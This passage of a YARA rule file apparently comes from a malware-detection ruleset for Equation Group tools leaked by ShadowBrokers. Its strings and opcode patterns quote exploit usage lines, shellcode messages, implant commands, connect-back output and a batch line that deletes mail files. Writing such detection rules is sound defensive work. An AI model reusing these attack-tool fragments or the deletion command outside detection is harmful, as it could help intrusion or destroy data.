hash1 = "b68f3f32bfa6cf11145c9fb9bf0075a5ca3938ea218b1cc29ad62f7b9e043255"
strings:
$s1 = "FullThreadDump.class" fullword ascii
$s2 = "ThreadMonitor.class" fullword ascii
$s3 = "Deadlock$DeadlockThread.class" fullword ascii
condition:
( uint16(0) == 0x4b50 and filesize < 30KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_EpWrapper {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "a8eed17665ee22198670e22458eb8c9028ff77130788f24f44986cce6cebff8d"
strings:
$x1 = "* Failed to get remote TCP socket address" fullword wide
$x2 = "* Failed to get 'LPStart' export" fullword wide
$s5 = "Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_RemoteExecute_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "4a649ca8da7b5499821a768c650a397216cdc95d826862bf30fcc4725ce8587f"
strings:
$s1 = "Win32_Process" fullword ascii
$s2 = "\\\\%ls\\root\\cimv2" fullword wide
$op1 = { 83 7b 18 01 75 12 83 63 }
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SendPKTrigger {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26"
strings:
$x1 = "----====**** PORT KNOCK TRIGGER BEGIN ****====----" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_parsescan {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file parsescan"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
strings:
$s1 = "$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\s+version/) or" fullword ascii
$s2 = "Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_Smbtouch_1_1_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
strings:
$x1 = "[+] Target is vulnerable to %d exploit%s" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Shares_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "6c57fb33c5e7d2dee415ae6168c9c3e0decca41ffe023ff13056ff37609235cb"
strings:
$s1 = "Select * from Win32_Share" fullword ascii
$s2 = "slocalhost" fullword wide
$s3 = "\\\\%ls\\root\\cimv2" fullword wide
$s4 = "\\\\%ls\\%ls" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__Emphasismine {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "dcaf91bd4af7cc7d1fb24b5292be4e99c7adf4147892f6b3b909d1d84dd4e45b"
hash2 = "348eb0a6592fcf9da816f4f7fc134bcae1b61c880d7574f4e19398c4ea467f26"
strings:
$x1 = "Error: Could not calloc() for shellcode buffer" fullword ascii
$x2 = "shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X" fullword ascii
$x3 = "Generating shellcode" fullword ascii
$x4 = "([0-9a-zA-Z]+) OK LOGOUT completed" fullword ascii
$x5 = "Error: Domino is not the expected version. (%s, %s)" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Dsz_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "fbe103fac45abe4e3638055a3cac5e7009166f626cf2d3049fb46f3b53c1057f"
hash2 = "ad1dddd11b664b7c3ad6108178a8dade0a6d9795358c4a7cedbe789c62016670"
strings:
$s1 = "%02u:%02u:%02u.%03u-%4u: " fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Windows_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "d38ce396926e45781daecd18670316defe3caf975a3062470a87c1d181a61374"
strings:
$s2 = "0#0)0/050;0M0Y0h0|0" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}
rule SSC_EquationGroup_DUL {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file DUL"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e"
strings:
$x1 = "?Usage: %s <shellcode> <output_file>" fullword ascii
$x2 = "Here is the decoder+(encoded-decoder)+payload" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "2a6ab28885ad7d5d64ac4c4fb8c619eca3b7fb3be883fc67c90f3ea9251f34c6"
strings:
$x1 = "[+] CheckCredentials(): Checking to see if valid username/password" fullword ascii
$x2 = "Error connecting to target, TbMakeSocket() %s:%d." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup__ftshell {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
hash4 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
strings:
$s1 = "if { [string length $uRemoteUploadCommand]" fullword ascii
$s2 = "processUpload" fullword ascii
$s3 = "global dothisreallyquiet" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}
rule SSC_EquationGroup_envoytomato {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file envoytomato"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "9bd001057cc97b81fdf2450be7bf3b34f1941379e588a7173ab7fffca41d4ad5"
strings:
$s1 = "[-] kernel not vulnerable" fullword ascii
$s2 = "[-] failed to spawn shell" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "052e778c26120c683ee2d9f93677d9217e9d6c61ffc0ab19202314ab865e3927"
hash2 = "5db457e7c7dba80383b1df0c86e94dc6859d45e1d188c576f2ba5edee139d9ae"
strings:
$x1 = "DFReader.exe logfile AESKey [-j] [-o outputfilename]" fullword ascii
$x2 = "Double Feature Target Version" fullword ascii
$x3 = "DoubleFeature Process ID" fullword ascii
$op1 = { a1 30 21 41 00 89 85 d8 fc ff ff a1 34 21 41 00 }
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_tacothief {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c71953cc84c27dc61df8f6f452c870a7880a204e9e21d9fd006a5c023b052b35"
strings:
$x1 = "File too large!  Must be less than 655360 bytes." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}
rule SSC_EquationGroup_scripme {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file scripme"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "a1adf1c1caad96e7b7fd92cbf419c4cfa13214e66497c9e46ec274a487cd098a"
strings:
$x1 = "running \\\"tcpdump -n -n\\\", on the environment variable \\$INTERFACE, scripted" fullword ascii
$x2 = "Cannot read $opetc/scripme.override -- are you root?" ascii
$x3 = "$ENV{EXPLOIT_SCRIPME}" ascii
$x4 = "$opetc/scripme.override" ascii
condition:
( filesize < 30KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Easybee_1_0_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "59c17d6cb564edd32c770cd56b5026e4797cf9169ff549735021053268b31611"
strings:
$x1 = "@@for /f \"delims=\" %%i in ('findstr /smc:\"%s\" *.msg') do if not \"%%MsgFile1%%\"==\"%%i\" del /f \"%%i\"" fullword ascii
$x2 = "Logging out of WebAdmin (as target account)" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "b439ed18262aec387984184e86bfdb31ca501172b1c066398f8c56d128ba855a"
strings:
$x1 = "[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)" fullword ascii
$x2 = "[%s] - Error building DLL loading shellcode" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_drivers_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "ee8b048f1c6ba821d92c15d614c2d937c32aeda7b7ea0943fd4f640b57b1c1ab"
strings:
$s1 = ".?AVFeFinallyFailure@@" fullword ascii
$s2 = "hZwLoadDriver" fullword ascii
$op1 = { b0 01 e8 58 04 00 00 c3 33 }
condition:
( uint16(0) == 0x5a4d and filesize < 30KB and all of them )
}
rule SSC_EquationGroup_gr_dev_bin_now {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "f5ed8312fc6e624b04e1e2d6614f3c651c9e9902ff41f4d069c32caca0869fa4"
strings:
$x1 = "HTTP_REFERER=\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\"" fullword ascii
$x2 = "exec /usr/share/redmin/cgi/redmin" fullword ascii
condition:
( filesize < 1KB and 1 of them )
}
rule SSC_EquationGroup_electricslide {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file electricslide"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014"
strings:
$x1 = "Firing with the same hosts, on altername ports (target is on 8080, listener on 443)" fullword ascii
$x2 = "Recieved Unknown Command Payload: 0x%x" fullword ascii
$x3 = "Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>" fullword ascii
$x4 = "-------- Delete Key - Remove a *closed* tab" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Ifconfig_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "1ebfc0ce7139db43ddacf4a9af2cb83a407d3d1221931d359ee40588cfd0d02b"
strings:
$s1 = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\%hs" fullword wide
$op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 }
$op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b }
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}
rule SSC_EquationGroup__ghost_sparc_ghost_x86_3 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1"
hash2 = "82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33"
strings:
$x1 = "Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target" fullword ascii
$x2 = "Sending shellcode as part of an open command..." fullword ascii
$x3 = "cmdshellcode" fullword ascii
$x4 = "You will not be able to run the shellcode. Exiting..." fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SetCallbackPorts {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "16f66c2593665c2507a78f96c0c2a9583eab0bda13a639e28f550c92f9134ff0"
strings:
$s1 = "USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]" fullword ascii
$s2 = "You may enter between 1 and 6 ports to change the defaults." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_emptycriss {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file emptycriss"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "a698d35a0c4d25fd960bd40c1de1022bb0763b77938bf279e91c9330060b0b91"
strings:
$s1 = "./emptycriss <target IP>" fullword ascii
$s2 = "Cut and paste the following to the telnet prompt:" fullword ascii
$s8 = "environ define TTYPROMPT abcdef" fullword ascii
condition:
( filesize < 50KB and 1 of them )
}
rule SSC_EquationGroup_jackpop {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file jackpop"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519"
strings:
$x1 = "%x:%d  --> %x:%d %d bytes" fullword ascii
$s1 = "client: can't bind to local address, are you root?" fullword ascii
$s2 = "Unable to register port" fullword ascii
$s3 = "Could not resolve destination" fullword ascii
$s4 = "raw troubles" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_ntevt {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "4254ee5e688fc09bdc72bcc9c51b1524a2bb25a9fb841feaf03bc7ec1a9975bf"
strings:
$x1 = "c:\\ntevt.pdb" fullword ascii
$s1 = "ARASPVU" fullword ascii
$op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }
$op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }
$op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }
condition:
( uint16(0) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )
}
rule SSC_EquationGroup_scanner_output {
meta:
description = "Detects output generated by EQGRP scanner.exe"
author = "Florian Roth"
reference = "Internal Research"
date = "2017-04-17"
strings:
$s1 = "# Scan for windows boxes" ascii fullword
$s2 = "Going into send" ascii fullword
$s3 = "# Does not work" ascii fullword
$s4 = "You are the weakest link, goodbye" ascii fullword
$s5 = "rpc   Scan for RPC  folks" ascii fullword
condition:
filesize < 1000KB and 2 of them
}
rule SSC_EquationGroup_tnmunger {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file tnmunger"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2"
strings:
$s1 = "TEST: mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
$s2 = "mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 10KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DS_ParseLogs {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "0228691d63038b072cdbf50782990d505507757efbfa87655bb2182cf6375956"
strings:
$x1 = "* Size (%d) of remaining capture file is too small to contain a valid header" fullword wide
$x2 = "* Capture header not found at start of buffer" fullword wide
$x3 = "Usage: %ws <capture_file> <results_prefix>" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_promiscdetect_safe {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "6070d8199061870387bb7796fb8ccccc4d6bafed6718cbc3a02a60c6dc1af847"
strings:
$s1 = "running on this computer!" fullword ascii
$s2 = "- Promiscuous (capture all packets on the network)" fullword ascii
$s3 = "Active filter for the adapter:" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_greatdoc_dll_config {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "fd9d0abfa727784dd07562656967d220286fc0d63bcf7e2c35d4c02bc2e5fc2e"
strings:
$x1 = "C:\\Projects\\GREATERDOCTOR\\trunk\\GREATERDOCTOR" ascii
$x2 = "src\\build\\Release\\dllConfig\\dllConfig.pdb" ascii
$x3 = "GREATERDOCTOR [ commandline args configuration ]" fullword ascii
$x4 = "-useage: <scanner> \"<cmdline args>\"" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SetOurAddr {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "04ccc060d401ddba674371e66e0288ebdbfa7df74b925c5c202109f23fb78504"
strings:
$s1 = "USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]" fullword ascii
$s2 = "Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_cryptTool {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file cryptTool"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2"
strings:
$s1 = "The encryption key is " fullword ascii
$s2 = "___tempFile2.out" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_toast_v3_2_0 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b"
strings:
$x2 = "Del --- Usage: %s -l file -w wtmp -r user" fullword ascii
$s5 = "Roasting ->%s<- at ->%d:%d<-" fullword ascii
$s6 = "rbnoil -Roasting ->" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 50KB and 1 of them )
}
rule SSC_EquationGroup_scanner {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file scanner"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
strings:
$x1 = "program version netid     address             service         owner" fullword ascii
$x4 = "*** Sorry about the raw output, I'll leave it for now" fullword ascii
$x5 = "-scan winn %s one" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
strings:
$x1 = "result = self.send_command(\"ls -al %s\" % self.options.DIR)" fullword ascii
$x2 = "cmd += \"D=-l%s \" % self.options.LISTEN_PORT" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 80KB and 1 of them )
}
rule SSC_EquationGroup_curseroot_win2k_v_2_1_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "a1637948ed6ebbd2e582eb99df0c06b27a77c01ad1779b3d84c65953ca2cb603"
strings:
$s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
$op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } /* Opcode */
$op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } /* Opcode */
$op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and $s1 and 2 of ($op*) )
}
rule SSC_EquationGroup_Toolset_Apr17_Banner_Implant9x {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "5d69a8cfc9b636448f023fcf18d111f13a8e6bcb9a693eb96276e0d796ab4e0c"
strings:
$s1 = ".?AVFeFinallyFailure@@" fullword ascii
$op1 = { c9 c3 57 8d 85 2c eb ff ff }
condition:
( uint16(0) == 0x5a4d and filesize < 20KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_xxxRIDEAREA {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "214b0de83b04afdd6ad05567825b69663121eda9e804daff9f2da5554ade77c6"
strings:
$x1 = "USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]" fullword ascii
$x2 = "The output payload \"%s\" has a size of %d-bytes." fullword ascii
$x3 = "ERROR: fwrite(%s) failed on ucPayload" fullword ascii
$x4 = "Load and execute implant within the existing thread" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_st_lp {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "3b6f756cca096548dcad2b6c241c1dafd16806c060bec82a530f4d38755286a2"
strings:
$x1 = "Previous command: set injection processes (status=0x%x)" fullword ascii
$x2 = "Secondary injection process is <null> [no secondary process will be used]" fullword ascii
$x3 = "Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> " fullword ascii
$x4 = "E: Execute a Command on the Implant" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_renamer {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "9c30331cb00ae8f417569e9eb2c645ebbb36511d2d1531bb8d06b83781dfe3ac"
strings:
$s1 = "FILE_NAME_CONVERSION.LOG" fullword wide
$s2 = "Log file exists. You must delete it!!!" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SlDecoder {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "b220f51ca56d9f9d7d899fa240d3328535f48184d136013fd808d8835919f9ce"
strings:
$x1 = "Error in conversion. SlDecoder.exe <input filename> <output filename> at command line " fullword wide
$x2 = "KeyLogger_Data" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "0654b4b8727488769390cd091029f08245d690dd90d1120e8feec336d1f9e788"
strings:
$s2 = "0M1U1Z1p1" fullword ascii /* base64 encoded string '3U5gZu' */
$s14 = "SPRQWV" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__vtuner_vtuner_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "3e6bec0679c1d8800b181f3228669704adb2e9cbf24679f4a1958e4cdd0e1431"
hash2 = "b0d2ebf455092f9d1f8e2997237b292856e9abbccfbbebe5d06b382257942e0e"
strings:
$s1 = "Unable to get -w hash.  %x" fullword wide
$s2 = "!\"invalid instruction mnemonic constant Id3vil\"" fullword wide
$s4 = "Unable to set -w provider. %x" fullword wide
$op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 }
$op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 }
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them )
}
rule SSC_EquationGroup_sambal {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file sambal"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec"
strings:
$s1 = "+ Bruteforce mode." fullword ascii
$s3 = "+ Host is not running samba!" fullword ascii
$s4 = "+ connecting back to: [%d.%d.%d.%d:45295]" fullword ascii
$s5 = "+ Exploit failed, try -b to bruteforce." fullword ascii
$s7 = "Usage: %s [-bBcCdfprsStv] [host]" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_PC_Level3_http_exe {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "3e855fbea28e012cd19b31f9d76a73a2df0eb03ba1cb5d22aafe9865150b020c"
strings:
$s1 = "Copyright (C) Microsoft" fullword wide
$op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }
$op2 = { 44 24 4e 41 88 5c 24 4f ff }
$op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }
condition:
